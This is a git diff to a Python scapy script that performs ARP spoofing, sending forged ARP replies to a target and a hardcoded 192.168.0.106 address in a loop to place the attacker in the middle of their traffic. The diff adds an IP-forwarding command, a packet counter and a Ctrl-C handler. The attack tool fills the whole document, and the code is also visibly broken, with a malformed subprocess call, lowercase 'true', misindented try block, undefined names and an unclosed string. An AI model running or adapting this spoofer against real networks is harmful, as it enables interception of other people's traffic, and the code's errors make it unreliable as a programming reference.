@@ -1,6 +1,7 @@
 import scapy.all as scapy
 import optparse
 import time
+import subprocess
 
 
 def getArgs() :
@@ -51,6 +52,8 @@ def getMac(ip) :
     return answered_list[1].hwsrc
 
 
+#  def restoreArptable() :
+
 def spoofTarget(targetip, spoofIP) :
     target_mac = getMac(targetip)
     packet = scapy.ARP(op=2, pdst=target["ip"], hwdst=target_mac, psrc=spoofIP)
@@ -58,11 +61,19 @@ def spoofTarget(targetip, spoofIP) :
 
     scapy.send(packet)
     
-
+# enable ip forwarding
+subprocess.call(["echo", "l", ">", "proc/sys/net/ipv4/ip_forward"])
 options = getArgs()
 result_dict = findIP(options.target)
 
+counter = 0
+try:
 while true:
     spoofTarget(result_dict[0], "192.168.0.106")
     spoofIptarget("192.168.0.106", result_dict[0]["ip"])
+    print(f"\r[+] packets sent: {counter}")
+    count = counter + 2
     time.sleep(2)
+
+except KeyboardInterrupt:
+    print("[-] Detected Ctrl-C, Program exited)
